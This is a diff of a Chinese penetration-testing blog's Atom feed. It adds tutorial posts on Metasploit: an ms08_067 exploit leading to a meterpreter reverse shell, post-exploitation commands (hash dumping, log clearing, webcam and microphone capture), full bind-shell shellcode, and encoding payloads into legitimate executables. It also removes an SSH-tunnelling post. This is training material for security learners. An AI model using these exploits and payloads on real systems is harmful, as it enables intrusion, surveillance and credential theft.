@@ -69,19 +69,19 @@
       <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
     
     
-      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
-    
-      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
-    
-      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
-    
-      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
-    
       <category term="python" scheme="http://c.cat.plus/tags/python/"/>
+    
+      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
     
       <category term="backdoor-factory" scheme="http://c.cat.plus/tags/backdoor-factory/"/>
     
+      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
+    
+      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
+    
       <category term="bdfproxy" scheme="http://c.cat.plus/tags/bdfproxy/"/>
+    
+      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
     
       <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
     
@@ -112,17 +112,17 @@
       <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
     
     
+      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
+    
       <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
     
       <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
     
-      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
-    
       <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
     
-      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
-    
       <category term="passing-the-hash" scheme="http://c.cat.plus/tags/passing-the-hash/"/>
+    
+      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
     
       <category term="shellter" scheme="http://c.cat.plus/tags/shellter/"/>
     
@@ -155,19 +155,19 @@
       <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
     
     
+      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
+    
       <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
+    
+      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
     
       <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
     
-      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
+      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
     
       <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
     
       <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
-    
-      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
-    
-      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
     
       <category term="Veil-evasion" scheme="http://c.cat.plus/tags/Veil-evasion/"/>
     
@@ -197,17 +197,17 @@
       <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
     
     
+      <category term="C" scheme="http://c.cat.plus/tags/C/"/>
+    
       <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
     
-      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
-    
       <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
+    
+      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
     
       <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
     
       <category term="strings" scheme="http://c.cat.plus/tags/strings/"/>
-    
-      <category term="C" scheme="http://c.cat.plus/tags/C/"/>
     
       <category term="gcc" scheme="http://c.cat.plus/tags/gcc/"/>
     
@@ -252,6 +252,113 @@
   </entry>
   
   <entry>
+    <title>meterpreter基本命令及其Python扩展</title>
+    <link href="http://c.cat.plus/2016/03/06/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/"/>
+    <id>http://c.cat.plus/2016/03/06/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/</id>
+    <published>2016-03-06T13:19:23.000Z</published>
+    <updated>2020-06-16T07:54:41.334Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a><strong>Meterpreter</strong></h4><p><strong>高级,动态,可扩展的payload</strong></p><ul><li>基于meterpreter上下文利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul><p><strong>完全基于内存的DLL注入式payload</strong> (不写硬盘)</p><ul><li>注入合法系统进程并建立stager</li><li>基于Stager上传和预加载DLL进行扩展模块的注入(客户端API)</li><li>基于Stager建立的socket连接建立加密的TLS/1.0通信隧道</li><li>利用TLS隧道进一步加载后续扩展模块(避免网络取证)</li></ul><p><strong>服务端使用C语言编写</strong></p><ul><li>客户端提供基于ruby的全特性API(支持任何语言)</li></ul><h4 id="meterpreter基本命令"><a href="#meterpreter基本命令" class="headerlink" title="meterpreter基本命令"></a><strong>meterpreter基本命令</strong></h4><p><strong>以ms08_067漏洞测试获取一个meterpreter会话</strong></p><pre><code>msfconsolesearch 08-067use exploit/windows/smb/ms08_067_netapishow optionsset rhost 192.168.254.113set target 34set paylaod windows/meterpreter/reverse_tcpset lhsot 192.168.254.118set lport 6666exploit -j sessions -i 1</code></pre><p><strong>基本命令</strong></p><pre><code>help / ?        #查看使用帮助    background        #将meterpreter终端隐藏在后台（快捷键ctrl+z）sessions        #查看已经成功获得的会话，如果想继续与某会话交互，可以使用sessions -i 命令.quit / exit        #直接关闭当前的meterpreter会话，返回MSF终端.run                #执行meterpreter模块或脚本run post/windows/gather/hashdump    #获取目标机器hash密码bgrun            #后台执行meterpreter模块或脚本bgrun vnc        #VNC远程监控bgrun service_manager -l     #查看目标系统已有服务,可以创建自启动或开启停止服务.bglist            #提供所有正在运行的后台脚本的列表bgkill             #杀死一个背景 meterpreter 脚本channel         #显示活动频道interact         #与通道进行交互write             #将数据写入到一个通道read             #从通道读取数据close             #关闭通道use             #加载 meterpreter 的扩展clearev            #清除目标系统日志shell            #获取目标系统的控制台shell.resource -r r.txt    #调用资源文件ldletime        #查看目标机器空闲时间,判断电脑前是否有人record_mic        #录制目标麦克风,窃取声音信息webcam_list     #列出摄像头设备webcam_snap -i 1 -v false    #使用摄像头监控irb                #在meterpreter会话与ruby终端交互.load            #加载扩展插件</code></pre><p><strong>文件系统命令</strong></p><pre><code>cd            #访问目标文件夹路径pwd            #查看目标当前路径#攻击者本机命令前加l,意为local本地lcd         #访问攻击者本机路径lpwd        #查看攻击者本机路径ls / dir    #查看目标文件列表.cat            #查看目标文件内容.mkdir        #在目标机器创建目录.mv            #移动文件或改名getwd        #获得目标机器上当前的工作目录，getlwd，这个命令可以获得当前系统的工作目录.upload        #可以上传文件或文件夹到目标机器上;upload 要上传的文件 C:\Users\buzz\Desktopdownload    #从目标机器上下载文件或文件夹，注意windows路径要用双斜杠进行转义. download C:\\test.txt /root/home/testedit        #调用vi编辑器，对目标机器上的文件进行编辑;edit c:\\windows\\system32\\drivers\\etc\\hostssearch        #可通过search -h查看帮助信息,参数-d指定搜索的起始目录或驱动，如果为空，将进行全盘搜索；参数-f指定搜索的文件或部分文件名，支持星号(*)匹配；参数-r递归搜索子目录.search -d c:\\windows -f *.txtrm / del    #删除目标机器的文件.rmdir /s/q c:\\test    #进入shell后使用此命令可以删除目录下的所有文件和文件夹，/s表示所有子目录和文件/q表示安静模式，不显示yes or no.</code></pre><p><strong>网络命令</strong></p><pre><code>arp            #查看APR缓存netstat        #查看网络连接情况ifconfig    #查看目标机器网络接口信息portfwd        #它是meterpreter自带的端口转发器，用于把目标机器的端口转发到本地端口；假设目标机开放了3389端口，使用如下命令将其转发到本地3456端口：portfwd add -l 3456 -p 3389 -r 192.168.88.110rdesktop -u 用户名 -p 密码 ip:端口          #连接开启远程桌面的windows系统.route        #显示目标机器的路由信息.</code></pre><p><strong>系统命令</strong></p><pre><code>ps            #用于获得目标主机上正在运行的进程信息.migrate pid    #将Meterpreter会话从一个进程迁移到另一个进程的内存空间中，可以配合ps -ef |grep explorer.exeexecute        #在目标机器上执行文件.    execute -H -i -f cmd.exe         #直接与cmd进行交互,参数-H 表示隐藏执行 -i 表示直接与cmd交互.#另外execute命令的-m参数支持直接从内存中执行攻击者的可执行文件.execute -H -m -d regedit.exe -f hidden_shell.exegetprivs    #查看获取的权限getproxy    #获取代理信息getsystem    #获取系统权限getpid        #获得当前会话所在进程的PID值.kill        #用于终结指定的PID进程.getuid        #用于获得运行meterpreter会话的用户名，从而查看当前会话具有的权限.sysinfo        #用于得到目标系统的一些信息，例如机器名，操作系统等.show_mount    #展示已挂载磁盘reboot        #重启目标机器shutdown    #关闭目标机器</code></pre><h4 id="Meterpreter-python扩展"><a href="#Meterpreter-python扩展" class="headerlink" title="Meterpreter python扩展"></a><strong>Meterpreter python扩展</strong></h4><ul><li>2015年11月份,来自社区的贡献</li><li>无需运行环境,在客户端运行原生python代码</li></ul><pre><code>load pythonhelppython_execute &quot;print(hello world)&quot;python_execute &quot;import os; cd=os.getcwd()&quot; -r cdpython_import -f find.py</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;Meterpreter&quot;&gt;&lt;a href=&quot;#Meterpreter&quot; class=&quot;headerlink&quot; title=&quot;Meterpreter&quot;&gt;&lt;/a&gt;&lt;strong&gt;Meterpreter&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;高级,动态,可扩展
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    
+      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
+    
+    
+      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
+    
+      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
+    
+      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
+    
+      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MSF生成和使用payload</title>
+    <link href="http://c.cat.plus/2016/03/05/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/"/>
+    <id>http://c.cat.plus/2016/03/05/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/</id>
+    <published>2016-03-05T11:17:52.000Z</published>
+    <updated>2020-06-16T07:57:20.878Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a><strong>生成payload</strong></h4><pre><code>msfconsoleuse payload/windows/shell_bind_tcp        #选择使用payload模块generate            #生成默认输出ruby语言shellcodegenerate -f c        #生成C语言的shellcodegenerate -f python    #生成python语言shellcodegenerate -f jav        #生成java语言shellcodegenerate -f exe        #生成为EXE可执行文件generate -h</code></pre><ul><li><p>默认输出为ruby语言16进制shellcode</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows/shell_bind_tcp - 328 bytes</span></span><br><span class="line"><span class="comment"># https://metasploit.com/</span></span><br><span class="line"><span class="comment"># VERBOSE=false, LPORT=4444, RHOST=, PrependMigrate=false, </span></span><br><span class="line"><span class="comment"># EXITFUNC=process, CreateSession=true</span></span><br><span class="line">buf = </span><br><span class="line"><span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"</span> +</span><br><span class="line"><span class="string">"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"</span> +</span><br><span class="line"><span class="string">"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"</span> +</span><br><span class="line"><span class="string">"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"</span> +</span><br><span class="line"><span class="string">"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"</span> +</span><br><span class="line"><span class="string">"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"</span> +</span><br><span class="line"><span class="string">"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"</span> +</span><br><span class="line"><span class="string">"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"</span> +</span><br><span class="line"><span class="string">"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"</span> +</span><br><span class="line"><span class="string">"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"</span> +</span><br><span class="line"><span class="string">"\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"</span> +</span><br><span class="line"><span class="string">"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"</span> +</span><br><span class="line"><span class="string">"\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68"</span> +</span><br><span class="line"><span class="string">"\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6"</span> +</span><br><span class="line"><span class="string">"\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"</span> +</span><br><span class="line"><span class="string">"\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57"</span> +</span><br><span class="line"><span class="string">"\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89"</span> +</span><br><span class="line"><span class="string">"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7"</span> +</span><br><span class="line"><span class="string">"\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50"</span> +</span><br><span class="line"><span class="string">"\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"</span> +</span><br><span class="line"><span class="string">"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d"</span> +</span><br><span class="line"><span class="string">"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff"</span> +</span><br><span class="line"><span class="string">"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"</span> +</span><br><span class="line"><span class="string">"\x6f\x6a\x00\x53\xff\xd5"</span></span><br></pre></td></tr></table></figure></li><li><p>MSF自动选择编码模块绕过坏字符</p></li></ul><pre><code>generate -b &apos;\x00&apos;generate -b &apos;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&apos;generate -b &apos;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26&apos;</code></pre><p><strong>直接使用payload</strong></p><ul><li>手动指定编码模块</li></ul><pre><code>show encoders        #显示可用编码模块generate -e x86/nonalpha    #-e参数指定编码模块generate -b &apos;\x00&apos; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exenc targetIP 4444</code></pre><p><strong>NOP</strong>: no-operation / Next Operation (无任何操作)</p><ul><li>EIP返回到存储NOP sled的任意地址时将递增,最终导致shellcode执行</li></ul><pre><code>generate -s 14</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;生成payload&quot;&gt;&lt;a href=&quot;#生成payload&quot; class=&quot;headerlink&quot; title=&quot;生成payload&quot;&gt;&lt;/a&gt;&lt;strong&gt;生成payload&lt;/strong&gt;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;msfconsole
+use pa
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    
+      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
+    
+    
+      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
+    
+      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
+    
+      <category term="ruby" scheme="http://c.cat.plus/tags/ruby/"/>
+    
+      <category term="shellcode" scheme="http://c.cat.plus/tags/shellcode/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MSF之Exploit模块</title>
+    <link href="http://c.cat.plus/2016/03/04/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/"/>
+    <id>http://c.cat.plus/2016/03/04/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/</id>
+    <published>2016-03-04T10:13:53.000Z</published>
+    <updated>2020-06-16T07:48:17.594Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="Exploit模块"><a href="#Exploit模块" class="headerlink" title="Exploit模块"></a><strong>Exploit模块</strong></h4><p><strong>Active Exploit</strong>    主动利用</p><pre><code>#smb漏洞,直接利用达到控制目标,类似永恒之蓝use exploit/windows/smb/psexec            set rhost 192.168.254.113set payload windows/shell/reverse_tcpset lhost 192.168.254.118set lport 4444set SMBUSER user1set SMBPASS pass1exploit</code></pre><p><strong>Passive Exploits</strong>    被动利用</p><pre><code>#针对早期IE6,IE7浏览器漏洞,诱使目标访问URL即可控制目标use exploit/windows/browser/ms07_017_ani_loadimage_chunksize    set URIPATH /set PAYLOAD windows/shell/reverse_tcpset LHOST 192.168.254.111set LPORT 4444exploit</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;Exploit模块&quot;&gt;&lt;a href=&quot;#Exploit模块&quot; class=&quot;headerlink&quot; title=&quot;Exploit模块&quot;&gt;&lt;/a&gt;&lt;strong&gt;Exploit模块&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Active Exploit&lt;/s
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    
+      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
+    
+    
+      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
+    
+      <category term="exploit" scheme="http://c.cat.plus/tags/exploit/"/>
+    
+      <category term="ms07_017" scheme="http://c.cat.plus/tags/ms07-017/"/>
+    
+  </entry>
+  
+  <entry>
     <title>MSF基本使用和控制台命令</title>
     <link href="http://c.cat.plus/2016/03/04/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/"/>
     <id>http://c.cat.plus/2016/03/04/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/</id>
@@ -280,9 +387,9 @@
       <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
     
     
-      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
-    
       <category term="nmap" scheme="http://c.cat.plus/tags/nmap/"/>
+    
+      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
     
       <category term="Metasploit" scheme="http://c.cat.plus/tags/Metasploit/"/>
     
@@ -322,9 +429,9 @@
     
       <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
     
-      <category term="shellcode" scheme="http://c.cat.plus/tags/shellcode/"/>
-    
       <category term="exploit" scheme="http://c.cat.plus/tags/exploit/"/>
+    
+      <category term="shellcode" scheme="http://c.cat.plus/tags/shellcode/"/>
     
   </entry>
   
@@ -463,11 +570,11 @@
       <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
     
     
+      <category term="squid3" scheme="http://c.cat.plus/tags/squid3/"/>
+    
       <category term="proxytunnel" scheme="http://c.cat.plus/tags/proxytunnel/"/>
     
       <category term="HTTP隧道" scheme="http://c.cat.plus/tags/HTTP%E9%9A%A7%E9%81%93/"/>
-    
-      <category term="squid3" scheme="http://c.cat.plus/tags/squid3/"/>
     
   </entry>
   
@@ -566,17 +673,17 @@
     
       <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
     
-      <category term="ncat" scheme="http://c.cat.plus/tags/ncat/"/>
-    
-      <category term="iodine" scheme="http://c.cat.plus/tags/iodine/"/>
+      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
     
       <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
     
       <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
     
-      <category term="ssh" scheme="http://c.cat.plus/tags/ssh/"/>
+      <category term="ncat" scheme="http://c.cat.plus/tags/ncat/"/>
     
-      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
+      <category term="iodine" scheme="http://c.cat.plus/tags/iodine/"/>
+    
+      <category term="ssh" scheme="http://c.cat.plus/tags/ssh/"/>
     
   </entry>
   
@@ -608,15 +715,15 @@
     
       <category term="Kali" scheme="http://c.cat.plus/tags/Kali/"/>
     
+      <category term="dns2tcp" scheme="http://c.cat.plus/tags/dns2tcp/"/>
+    
       <category term="squid3" scheme="http://c.cat.plus/tags/squid3/"/>
+    
+      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
     
       <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
     
       <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
-    
-      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
-    
-      <category term="dns2tcp" scheme="http://c.cat.plus/tags/dns2tcp/"/>
     
       <category term="Bodhi" scheme="http://c.cat.plus/tags/Bodhi/"/>
     
@@ -651,128 +758,11 @@
     
       <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
     
+      <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
+    
       <category term="VNC" scheme="http://c.cat.plus/tags/VNC/"/>
     
-      <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
-    
       <category term="proxychains" scheme="http://c.cat.plus/tags/proxychains/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SSH隧道和SSH本地端口转发</title>
-    <link href="http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E9%9A%A7%E9%81%93%E5%92%8CSSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
-    <id>http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E9%9A%A7%E9%81%93%E5%92%8CSSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
-    <published>2015-07-02T19:23:17.000Z</published>
-    <updated>2020-05-27T02:31:43.446Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><h3 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a><strong>SSH 隧道</strong></h3></blockquote><h4 id="SSH支持双向通信隧道技术"><a href="#SSH支持双向通信隧道技术" class="headerlink" title="SSH支持双向通信隧道技术"></a><strong>SSH支持双向通信隧道技术</strong></h4><ul><li>将其它TCP端口的通信通过SSH链接来转发</li><li>用SSH作为传输层协议,对流量自动加解密</li><li>突破防火墙访问规则的限制,可用于翻墙<h4 id="SSH-本地端口转发"><a href="#SSH-本地端口转发" class="headerlink" title="SSH 本地端口转发"></a><strong>SSH 本地端口转发</strong></h4></li><li>使效果类似于Rinetd</li><li>将一本地端口与远程服务器建立隧道<h4 id="建立双向安全隧道"><a href="#建立双向安全隧道" class="headerlink" title="建立双向安全隧道"></a><strong>建立双向安全隧道</strong></h4></li><li>将其它TCP端口的通信通过SSH链接来转发</li><li>用SSH作为传输层协议,对流量自动加解密</li><li>突破防火墙访问规则的限制,可用于翻墙<h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a><strong>本地端口转发</strong></h4></li><li>本机侦听端口,访问转发到远程主机指定端口<h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a><strong>远程端口转发</strong></h4></li><li>远程侦听端口,访问转发到本机主机指定端口<h4 id="动态隧道模式"><a href="#动态隧道模式" class="headerlink" title="动态隧道模式"></a><strong>动态隧道模式</strong></h4></li><li>动态端口转发</li></ul><blockquote><h4 id="将本地端口与远程服务器建立隧道"><a href="#将本地端口与远程服务器建立隧道" class="headerlink" title="将本地端口与远程服务器建立隧道"></a><strong>将本地端口与远程服务器建立隧道</strong></h4></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Kali默认不允许Root登录,修改以下配置</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">PermitRootLogin prohibit-password#注释此项</span><br><span class="line">PermitRootLogin yes#add此项</span><br><span class="line">Port 53#更改默认端口</span><br><span class="line">PasswordAuthentication yes#取消注释此项</span><br><span class="line"></span><br><span class="line">service ssh start#Kali默认不启动SSH服务,启动SSH</span><br><span class="line">service ssh restart#修改配置后重启SSH服务</span><br><span class="line"></span><br><span class="line">本地端口转发:</span><br><span class="line">ssh -fCNg -L &lt;local listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt; #本地端口转发侦听</span><br><span class="line">ssh -L 7001:192.168.1.124:80 root@192.168.1.110 -p 53</span><br><span class="line"></span><br><span class="line">ssh -fCNg -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt; </span><br><span class="line"></span><br><span class="line">-f#后台运行进程</span><br><span class="line">-N#不执行登录shell</span><br><span class="line">-g#复用访问时作为网关,支持多主机访问本地侦听端口</span><br></pre></td></tr></table></figure><ul><li>网关模式转发RDP,NC shell</li><li>端口转发基于建立起来的SSH隧道,隧道中断则端口转发中断</li><li>只能在建立隧道时创建转发,不能为已有隧道增加端口转发</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
